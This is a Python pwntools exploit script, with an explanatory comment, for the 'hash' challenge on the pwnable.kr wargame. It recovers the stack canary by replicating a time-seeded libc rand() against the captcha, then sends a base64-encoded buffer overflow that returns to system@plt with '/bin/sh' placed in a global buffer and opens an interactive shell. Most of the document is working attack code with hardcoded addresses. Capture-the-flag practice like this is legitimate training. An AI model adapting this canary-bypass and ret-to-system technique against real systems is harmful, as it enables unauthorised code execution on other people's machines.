#!/usr/bin/python3

from pwn import *
from ctypes import CDLL
from base64 import b64encode
import time

elf = context.binary = ELF("hash")
libc_rand = CDLL("libc.so.6")

slp = 1
host = "pwnable.kr"
port = 9002

def start():
    if args.REMOTE:
        io = remote(host, port)
        time_i = int(time.time())
        io.timeout = 0.1
        return io, time_i
    else:
        io = process(elf.path)
        time_i = int(time.time())
        io.timeout = 0.1
        return io, time_i

'''
tl;dr:
we reverse the program to find we can do a buffer overflow when translating from b64 to normal
we calculate/debug to figure that we need 128*4 chars of padding to reach the canary.
though about a lot of ways to attack the canary, mostly because of the really odd clue given on site
though maybe since it runs on the same webservice as the site that means it forks() new connections
thereby keeping the same stack canary for every connection which allows for a byte at a time canary attack.
that is impossible because the b64 decode function appends a null byte to the end of the string thereby
changine at least 2 bytes of the canary which doesn't allow for a byte at a time attempt.
then i saw that with a weird input of padding + '==' i could trick the b64 function
to overestimate the length of the buffer which thereby makes the md5 function read 2 bytes of the canary
this allows us to figure out the bytes of the canary one at a time (we know that the lsbyte of the canary is 0)
however upon attempting that on the remote server i saw the hash changes every time meaning the canary changes so all of that is gone.

then i tried reading the program again and i noticed the captcha uses the canary for its calculations.
since it calls srand() with time, we know that if we call time locally it will be a few seconds of at most.
given time we can generate the same 8 numbers as the prorgam and use the captcha to reverse the canary.
since we are not sure about time, if the lsbyte of the canary is not 0, we increase time by 1 sec and try again.
(it is very unlikely for the incorrect time to produce a canary with lsbyte 0, and even if it does we can just execute again)
now we have the canary we translate it to its unsigned form.
now we can do the buffer overflow and replace the canary.

The task is still not over though as the binary runs on a system with ASLR enabled, thereby leaving us more work to do.
we can't use the b64-decoded buffer since its on the stack which's memory is unknown to us due to ASLR.

We Can however use the b64 array g_buf since it is in the .bss section (The binary is NOT position independent)
we return to system, and give it as a parameter the address of g_buf + the b64_exploit.
we can figure out the exploit length by running it once, printing it, and then correcting to g_buf address to include the offset.
lastly, we append '==/bin/sh\0' to the b64 exploit, the '==' causes the decoder to stop reading afterwards, while we get our /bin/sh
in code, which i found to be the toughest part because of ASLR. we don't need to find system in libc since the code calls system
in main, so we can just ROP to system@plt and we win :)


ps: python implements random differently then libc does which results in a different number sequence
when trying to figure out the canary, so in order to use the exact same random,
we can load the libc random with CDLL from ctypes.
'''


# EXPLOIT CODE HERE:
# =============================================================================

def get_unsigned(num):
    return num & (2**32-1)


def get_hash_without_canary(seed):
    libc_rand.srand(seed)
    hash_value = [libc_rand.rand() for i in range(8)]
    total  = hash_value[5] + hash_value[1] + hash_value[2]
    total -= hash_value[3]
    total += hash_value[7] + (hash_value[4]-hash_value[6])
    return total


def calculate_canary(captcha, time_i):
    ''' captcha = get_hash_without_canary + canary =>
        canary = captcha - get_hash_without_canary '''
    canary = 0xFF
    seed = time_i

    while True:
        canary_signed = captcha - get_hash_without_canary(seed)
        canary = get_unsigned(canary_signed)
        if canary & 0xFF == 0:
            break
        seed += 1
    
    return canary


def get_canary(io, time_i):
    sleep(slp)
    prologue = io.recvuntil("captcha :").decode()
    print(prologue)
    sleep(slp)
    captcha_s = io.recvline()
    captcha = int(captcha_s)
    print(f"captcha in string format:{captcha_s}, number: {captcha}")
    sleep(slp)
    io.send(captcha_s)
    sleep(slp)
    print(io.recv())
    return calculate_canary(captcha, time_i)
    

system_plt = 0x08048880
main_start = 0x0804908f
g_buf_addr = 0x0804b0e0
puts_at_plt = 0x080489c0
puts_at_GOT = 0x0804B068

io, time_i = start()
canary = get_canary(io, time_i)

print(f"the canary is: {hex(canary)}")

padding = b"AAAA"*128
# padding = b"/bin/sh\0"*64
canary_s = p32(canary)
second_padding = b"BBBBCCCCDDDD"
r1 = p32(system_plt) 
r2 = p32(main_start)

exp  = padding + canary_s + second_padding 
exp += r1
exp += r2
exp += p32(g_buf_addr+722)

b64_exp = b64encode(exp)
# print(len(b64_exp))
b64_exp += b"==/bin/sh\0"

io.sendline(b64_exp)
print(io.recv())



# =============================================================================

io.interactive()










"""
some debugging to make sure everything works

SEED = 0x624c8c02 
# actual canary: 0x5cb9bc00
# res: 0x5cb9bc00
captcha = 1198331235
canary = calculate_canary(captcha)

"""





